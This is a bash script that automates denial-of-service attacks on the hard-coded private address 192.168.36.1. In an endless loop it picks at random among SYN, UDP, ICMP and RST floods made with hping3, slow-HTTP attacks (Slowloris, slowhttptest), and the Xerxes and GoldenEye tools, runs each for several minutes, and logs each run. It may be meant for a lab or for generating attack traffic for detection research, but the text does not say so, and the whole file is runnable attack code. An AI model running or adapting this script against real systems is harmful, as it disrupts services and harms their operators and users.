#!/bin/bash

# Target IP
TARGET_IP="192.168.36.1"

# Log file
LOG_FILE="attack_log.txt"

# Function to log attacks
log_attack() {
    echo "$(date) - Executed $1 attack on $TARGET_IP" >> $LOG_FILE
}

# Function to run Slowloris DoS attack
run_slowloris() {
    TIMEOUT=$((RANDOM % 181 + 120))
    echo "Running Slowloris attack on $TARGET_IP for $TIMEOUT seconds..."
    timeout $TIMEOUT slowloris $TARGET_IP &
    log_attack "Slowloris"
}

# Function to run Hping3 (TCP SYN flood)
run_hping3() {
    TIMEOUT=$((RANDOM % 181 + 120))  
    echo "Running Hping3 (SYN flood) on $TARGET_IP for $TIMEOUT seconds..."
    timeout $TIMEOUT hping3 --flood -S $TARGET_IP -p 80 &
    log_attack "Hping3 SYN Flood"
}

# Function to run SYN flood attack using Hping3
run_synflood() {
    TIMEOUT=$((RANDOM % 181 + 120))
    echo "Running SYN Flood on $TARGET_IP for $TIMEOUT seconds..."
    timeout $TIMEOUT hping3 -i u40 -S -p 80 -c 100000 $TARGET_IP &
    log_attack "SYN Flood"
}

# Function to run Slowhttptest (Slow HTTP DoS)
run_slowhttptest() {
    TIMEOUT=$((RANDOM % 181 + 120)) 
    echo "Running Slowhttptest attack on $TARGET_IP for $TIMEOUT seconds..."
    timeout $TIMEOUT slowhttptest -c 100 -i 10 -r 200 -t GET -p 80 -u http://$TARGET_IP &
    log_attack "Slowhttptest"
}

# Function to run UDP flood attack using Hping3
run_udpflood() {
    TIMEOUT=$((RANDOM % 181 + 120))
    echo "Running UDP flood on $TARGET_IP for $TIMEOUT seconds..."
    timeout $TIMEOUT hping3 --flood --udp $TARGET_IP -p 53 &
    log_attack "UDP Flood"
}

# Function to run Xerxes (HTTP DoS attack)
run_xerxes() {
    TIMEOUT=$((RANDOM % 181 + 120))
    echo "Running Xerxes DoS attack on $TARGET_IP for $TIMEOUT seconds..."
    timeout $TIMEOUT ./xerxes $TARGET_IP 80 &
    log_attack "Xerxes"
}

# Function to run GoldenEye (HTTP DoS attack)
run_goldeneye() {
    TIMEOUT=$((RANDOM % 181 + 120))
    echo "Running GoldenEye DoS attack on $TARGET_IP for $TIMEOUT seconds..."
    timeout $TIMEOUT python3 goldeneye.py http://$TARGET_IP &
    log_attack "GoldenEye"
}

# Function to run ICMP Flood attack
run_icmp_flood() {
    TIMEOUT=$((RANDOM % 181 + 120))
    echo "Running ICMP Flood on $TARGET_IP for $TIMEOUT seconds..."
    timeout $TIMEOUT hping3 --flood --icmp $TARGET_IP &
    log_attack "ICMP Flood"
}

# Function to run TCP RST Flood attack
run_rst_flood() {
    TIMEOUT=$((RANDOM % 181 + 120))
    echo "Running TCP RST Flood on $TARGET_IP for $TIMEOUT seconds..."
    timeout $TIMEOUT hping3 -R --flood $TARGET_IP -p 80 &
    log_attack "TCP RST Flood"
}

# Main function to run DoS attacks continuously
main() {
    echo "Starting automated DoS attacks on $TARGET_IP..."
    echo "Logging attacks in $LOG_FILE"

    # List of available attack functions
    ATTACKS=(
        "run_slowloris" "run_hping3" "run_synflood" "run_slowhttptest"
        "run_udpflood" "run_xerxes" "run_goldeneye" "run_icmp_flood" 
        "run_rst_flood"
    )

    while true; do
        # Select a random attack
        ATTACK=${ATTACKS[$RANDOM % ${#ATTACKS[@]}]}

        # Execute the selected attack
        $ATTACK

        RANDOM_DELAY=$((RANDOM % 121 + 180))
        echo "Waiting $RANDOM_DELAY seconds before next attacks..."
        sleep $RANDOM_DELAY
    done
}

# Start the main function
main
